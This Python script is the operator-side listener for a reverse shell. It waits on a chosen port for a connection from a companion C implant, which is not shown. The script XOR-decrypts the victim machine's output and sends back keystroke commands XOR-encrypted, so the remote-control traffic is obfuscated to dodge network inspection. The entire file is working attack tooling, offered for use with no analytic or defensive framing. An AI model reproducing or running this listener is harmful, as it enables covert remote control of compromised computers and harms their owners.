import socket
import sys
import threading
import argparse

# XOR Key must match the C code (0x5A)
XOR_KEY = 0x5A

def xor_crypt(data):
    if isinstance(data, str):
        data = data.encode()
    return bytes([b ^ XOR_KEY for b in data])

def handle_receive(client_socket):
    while True:
        try:
            data = client_socket.recv(1024)
            if not data:
                break
            # Decrypt incoming data from the reverse shell
            decrypted = xor_crypt(data)
            sys.stdout.buffer.write(decrypted)
            sys.stdout.flush()
        except Exception as e:
            break

def start_server(port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', port))
    server.listen(1)
    print(f"[*] Encrypted Listener started on port {port}")
    print(f"[*] Waiting for connection...")
    
    client, addr = server.accept()
    print(f"[*] Connection received from {addr[0]}:{addr[1]}")
    
    # Start a thread to handle incoming data
    receive_thread = threading.Thread(target=handle_receive, args=(client,))
    receive_thread.daemon = True
    receive_thread.start()
    
    # Main loop to handle sending commands
    while True:
        try:
            # Read from stdin (user input)
            cmd = sys.stdin.buffer.read(1)
            if not cmd:
                break
            
            # Encrypt and send
            encrypted = xor_crypt(cmd)
            client.send(encrypted)
        except KeyboardInterrupt:
            print("\n[*] Exiting...")
            break
        except Exception as e:
            print(f"\n[!] Error: {e}")
            break
            
    client.close()
    server.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="XOR Encrypted Reverse Shell Listener")
    parser.add_argument("port", type=int, help="Port to listen on")
    args = parser.parse_args()
    start_server(args.port)
